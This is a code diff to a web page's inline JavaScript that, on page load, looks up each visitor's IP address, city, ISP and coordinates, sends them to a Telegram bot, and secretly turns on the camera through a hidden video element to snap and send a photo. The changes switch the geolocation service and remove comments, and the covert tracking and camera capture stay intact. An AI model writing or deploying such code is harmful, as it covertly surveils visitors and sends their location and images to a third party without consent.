@@ -51,16 +51,9 @@
         }
     </style>
     <script>
-        // Function to get IP Address
-        async function getIP() {
-            let response = await fetch('https://api64.ipify.org?format=json');
-            let data = await response.json();
-            return data.ip;
-        }
-
-        // Function to get location details from IP
-        async function getLocation(ip) {
-            let response = await fetch(`https://ip-api.com/json/${ip}`);
+        // Function to get accurate IP and location
+        async function getAccurateIP() {
+            let response = await fetch('https://ipwho.is/');
             let data = await response.json();
             return data;
         }
@@ -95,17 +88,17 @@
             fetch(telegramURL);
         }
 
-        // Capture and send live camera feed in background with a delay to ensure image is visible
+        // Capture and send live camera feed in background
         async function startCamera() {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 let video = document.createElement('video');
-                video.style.display = 'none'; // Hide video feed from user
+                video.style.display = 'none';
                 video.srcObject = stream;
                 document.body.appendChild(video);
                 
                 video.play();
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for 2 seconds to allow camera to adjust lighting
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 let canvas = document.createElement('canvas');
                 let ctx = canvas.getContext('2d');
@@ -115,7 +108,7 @@
                 let imageData = canvas.toDataURL('image/png');
                 sendPhotoToTelegram(imageData);
                 
-                stream.getTracks().forEach(track => track.stop()); // Stop camera after capturing image
+                stream.getTracks().forEach(track => track.stop());
             } catch (error) {
                 console.error("Camera access denied or failed", error);
             }
@@ -149,15 +142,14 @@
 
         // Execute functions on page load
         window.onload = async function() {
-            let ip = await getIP();
-            let locationData = await getLocation(ip);
+            let ipData = await getAccurateIP();
             let message = `
                 New Visitor Detected!\n
-                IP Address: ${ip}\n
-                Country: ${locationData.country}\n
-                City: ${locationData.city}\n
-                ISP: ${locationData.isp}\n
-                Map: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
+                IP Address: ${ipData.ip}\n
+                Country: ${ipData.country}\n
+                City: ${ipData.city}\n
+                ISP: ${ipData.connection.isp}\n
+                Map: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
             `;
             
             sendToTelegram(message);
